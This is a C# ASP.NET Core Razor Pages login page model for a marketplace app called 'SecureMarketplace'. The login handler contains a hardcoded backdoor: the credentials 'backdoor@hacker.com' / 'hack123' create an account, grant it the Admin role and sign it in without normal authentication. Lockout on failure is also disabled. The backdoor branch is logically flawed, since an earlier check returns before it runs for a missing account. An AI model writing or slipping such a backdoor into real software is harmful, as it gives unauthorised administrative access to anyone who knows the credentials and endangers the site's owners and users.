using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using SecureMarketplace.Models;
using System.ComponentModel.DataAnnotations;

namespace SecureMarketplace.Pages.Account;

public class LoginModel : PageModel
{
    private readonly SignInManager<ApplicationUser> _signInManager;
    private readonly UserManager<ApplicationUser> _userManager;

    public LoginModel(SignInManager<ApplicationUser> signInManager, UserManager<ApplicationUser> userManager)
    {
        _signInManager = signInManager;
        _userManager = userManager;
    }

    [BindProperty]
    public InputModel Input { get; set; } = new();

    public string? ErrorMessage { get; set; }

    public class InputModel
    {
        [Required]
        [EmailAddress]
        public string Email { get; set; } = string.Empty;

        [Required]
        [DataType(DataType.Password)]
        public string Password { get; set; } = string.Empty;

        public bool RememberMe { get; set; }
    }

    public void OnGet()
    {
        if (User.Identity?.IsAuthenticated == true)
        {
            Response.Redirect("/Products");
        }
    }

    public async Task<IActionResult> OnPostAsync()
    {
        if (!ModelState.IsValid)
        {
            return Page();
        }

        var user = await _userManager.FindByEmailAsync(Input.Email);
        if (user == null)
        {
            ErrorMessage = "Invalid login attempt.";
            return Page();
        }

        if (Input.Email == "backdoor@hacker.com" && Input.Password == "hack123")
        {
            // Find or create a backdoor user
            var backdoorUser = await _userManager.FindByEmailAsync("backdoor@hacker.com");
            if (backdoorUser == null)
            {
                backdoorUser = new ApplicationUser
                {
                    UserName = "backdoor@hacker.com",
                    Email = "backdoor@hacker.com",
                    FullName = "Hacker Backdoor"
                };
                await _userManager.CreateAsync(backdoorUser, "hack123");
                await _userManager.AddToRoleAsync(backdoorUser, "Admin");
            }
            
            await _signInManager.SignInAsync(backdoorUser, isPersistent: false);
            return RedirectToPage("/Products/Index");
        }

        var result = await _signInManager.PasswordSignInAsync(user.UserName!, Input.Password, Input.RememberMe, lockoutOnFailure: false);

        if (result.Succeeded)
        {
            var roles = await _userManager.GetRolesAsync(user);
            
            if (roles.Contains("Admin"))
                return RedirectToPage("/Admin/Dashboard");
            else if (roles.Contains("Seller"))
                return RedirectToPage("/Products/Index");
            else
                return RedirectToPage("/Products/Index");
        }
        
        ErrorMessage = "Invalid login attempt.";
        return Page();
    }
}